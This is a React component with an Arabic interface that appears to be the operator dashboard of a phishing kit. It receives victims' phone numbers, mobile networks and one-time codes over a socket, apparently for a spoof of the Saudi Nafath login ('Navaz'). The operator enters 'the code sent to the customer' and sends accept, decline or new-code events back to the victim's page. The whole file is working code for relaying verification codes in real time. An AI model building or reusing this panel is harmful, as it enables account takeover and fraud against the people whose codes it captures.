import React, { useState } from 'react'
import { IoIosCheckmarkCircleOutline } from "react-icons/io";
import { AiOutlineStop } from "react-icons/ai";
import { CiShop } from "react-icons/ci";
import { GrView } from "react-icons/gr";
import { FaKey } from 'react-icons/fa';

const Alret = ({data,setPoup,setData,socket,setActive}) => {
    const [display,setDisplay] = useState({visible:false,order:{}})
    const [userOtp,setUserOtp] = useState(null)
        const MotslOtp = (item)=>{
            socket.emit('MotslOtpSend',{...item,userOtp})
            setDisplay({visible:false,order:{}})
        }

        const acceptNavazValidate = (item)=>{
            socket.emit('successValidate',item)
            setDisplay({visible:false,order:{}})
            setUserOtp(null)
            setData(data.filter((e)=>{
                return e.ref !== item.ref
             }));
        }
        const declineOrderValidate = (item)=>{
            
            if(userOtp){
                socket.emit('declineValidate',{otp:item.otp,new:userOtp})
                setDisplay({visible:false,order:{}})
                     setData(data.filter((e)=>{
                        return e.ref !== item.ref
                     }));
                }else {
                    setData(data.filter((e)=>{
                        return e.ref !== item.ref
                     }));
                    return window.alert('ادخل الرمز الجديد')
                }
            setUserOtp(null)
                }
        

        

  return (  
    <>
    {data.length ?<div className='fixed w-full flex items-start justify-center bottom-0' >
       <div className='bg-red w-11/12 sm:w-96 rounded-md text-white flex flex-col justify-center gap-y-2 items-end px-2 py-4' dir='rtl'>
        {data.length ? data.map((item)=>{
            return (
                <>
                {
                 item.mode==='orderValidate' ?
                     <div className='flex  justify-end items-center  px-2 bg-green-500 w-full rounded-lg'>
                        <div className='flex  flex-col justify-start items-start  px-2 w-4/5 py-2'>
                            <span>تحقق رقم طلب</span>
                                <div className=''>
                                    {console.log(item)}
                                    <span className='text-xs sm:text-base'>الرقم المرسل للعميل</span >
                                    <span className='text-xs sm:text-base'>  {item.otp }  </span>
                                </div>
                        </div>
                        <div className='flex w-1/5  justify-around '>
                            <IoIosCheckmarkCircleOutline  className='text-white text-2xl cursor-pointer' onClick={()=>{ setData(data.filter((e)=>{
                    return e.ref !== item.ref
                 }));setDisplay({order:item,visible:true})}}/>
                       </div>
                    </div>:
                    <div className='flex  justify-end items-center  px-2 bg-green-800 w-full rounded-lg'>
                        <div className='flex w-1/5  justify-around '>
                            <GrView   className='text-white animate-bounce transition-all  text-2xl cursor-pointer' onClick={()=>{
                                setData(data.filter((e)=>{
                                    return e.ref !== item.ref
                                 }));
                                setDisplay({order:item,visible:true})     
                        }}/>
                   </div>
                    <div className='flex  flex-col justify-start items-end  px-2 w-4/5 py-2'>
                            <div className='flex gap-x-2 justify-evenly items-center'>
                            <span> رمز تحقق متصل  </span><FaKey className='text-lg'/>
                            </div>
                            <div className=''>
                                {item?.network }
                                <span className='text-xs sm:text-base'> From : </span >
                                <span className='text-xs sm:text-base'>  {item?.phone }  </span>
                            </div>
                    </div>
                </div>}
                 
           </>
            )
        } )
        : null}
      
       </div>
    </div> :null }
    
    {display.visible ? 
    display.order.mode==='MotslOtp' ?
        
    <div className='absolute bg-black bg-opacity-50  w-full flex items-center justify-center  z-50  top-0 min-h-screen'  >
        <div className='bg-white rounded-lg w-4/5 grid grid-cols-1  lg:grid-cols-3 items-center justify-center my-2 p-3 '>
            <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>هاتف </span>
                <span className='w-2/3  px-1 text-sm text-center '>{display.order.phone}</span>
            </div>    
            <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>شبكة جوال </span>
                <span className='w-2/3  px-1 text-sm text-center '>{display.order.network}</span>
            </div>    
            <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>otp </span>
                <span className='w-2/3  px-1 text-sm text-center '>{display.order.otp}</span>
            </div> 
            <div className='md:col-span-3 flex flex-col justify-center items-center p-2 gap-2'>
                                <span className='text-red-500 text-center w-full' >  ادخل الرمز المرسل الي العميل </span>
                                <input type='text' value={userOtp} className='border-2 p-2 md:w-1/5 w-1/3 rounded-lg text-center' onChange={(e)=>setUserOtp(e.target.value)}/>
                                <div className='flex w-full mt-2 gap-x-1 items-center justify-center md:col-span-2'>
                                    <button className='flex-1 text-lg  bg-green-600 text-white py-1 md:px-3 rounded-md hover:opacity-50 cursor-pointer transition-all md:w-1/4 md:flex-grow-0'  onClick={()=>MotslOtp(display.order)}>ارسال</button>
                                </div>
                    </div>   
        </div>
    </div>
    :
    <div className='absolute bg-black bg-opacity-50  w-full flex items-center justify-center  z-50  top-0 min-h-screen'  >
        <div className='bg-white rounded-lg w-4/5 grid grid-cols-1  lg:grid-cols-3 items-center justify-center my-2 p-3 '>
                    <div className='w-full flex justify-around p-1  items-center' dir='rtl' style={{border:'1px solid #6fd545'}}>
                        <span className='w-1/3  text-green-500 text-sm' style={{borderLeft:'1px solid #6fd545'}}>رقم الطلب</span>
                        <span className='w-2/3  px-1 text-sm text-center '>{display.order.otp}</span>
                        </div>
                            <div className='md:col-span-3 flex flex-col justify-center items-center p-2 gap-2'>
                                <span className='text-red-500 text-center w-full' > في حاله الرفض برجاء ادخال الرمز المرسل الي العميل </span>
                                <input type='text' className='border-2 p-2 md:w-1/5 w-1/3 rounded-lg text-center' value={userOtp} onChange={(e)=>setUserOtp(e.target.value)}/>
                                <div className='flex w-full mt-2 gap-x-1 items-center justify-center md:col-span-2'>
                                <button className='flex-1 text-lg bg-red-600 text-white py-1 md:px-3 rounded-md hover:opacity-50 cursor-pointer transition-all md:w-1/4 md:flex-grow-0' onClick={()=>declineOrderValidate(display.order)}> رفض</button>
                                <button className='flex-1 text-lg  bg-green-600 text-white py-1 md:px-3 rounded-md hover:opacity-50 cursor-pointer transition-all md:w-1/4 md:flex-grow-0'  onClick={()=>acceptNavazValidate(display.order)}>تأكيد</button>
                </div>
                    </div>
        </div>
    </div>
     :null }
    </>
  )
}

export default Alret

